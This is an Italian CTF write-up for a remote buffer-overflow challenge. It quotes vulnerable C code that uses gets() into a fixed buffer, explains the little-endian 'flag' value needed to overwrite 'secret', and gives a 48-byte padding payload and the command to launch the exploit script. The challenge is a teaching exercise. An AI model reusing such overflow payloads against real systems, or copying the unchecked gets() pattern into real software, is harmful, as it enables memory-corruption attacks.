# Buffer Overflow (bof.c) - PWN remoto

**Server:** `thekidofarcrania.com:35235`
**Stato:** il server della challenge **non e' piu' raggiungibile** (connessione rifiutata/timeout). Qui c'e' l'exploit corretto da usare quando/se il server torna online.

## Analisi (dal sorgente `bof.c`)
`vuln()` ha:
```c
char padding[16];
char buff[32];
int notsecret = 0xffffff00;
int secret    = 0xdeadbeef;
...
gets(buff);                 // overflow!
if (secret == 0x67616c66) { print_flag(); }
```
Il valore richiesto e' `secret == 0x67616c66`. In little-endian `0x67616c66` sono i byte `66 6c 61 67` = i caratteri ASCII **`flag`**. Quindi per vincere bisogna scrivere la stringa `flag` sopra `secret`.

## Exploit - passo per passo
1. Il payload e' gia' in `expolit.py`:
   ```python
   payload = b'A' * 48 + b'flag\n'
   ```
   - 48 byte di riempimento (32 di `buff` + 16 di `padding`)
   - poi `flag` --> imposta `secret = 0x67616c66`
2. Lancia l'exploit:
   ```
   cd remote_bof
   python3 expolit.py
   ```
3. Se il server risponde, dopo l'overflow stampa la flag.

## Nota sull'offset
Il server stampa una **visualizzazione dello stack** prima e dopo l'input. Se vedi il messaggio
`maybe you overflowed too much` (hai toccato `notsecret`) oppure `haven't overflowed enough`,
regola il numero di `A` (48) in base alla visualizzazione finche' solo `secret` diventa `flag`.
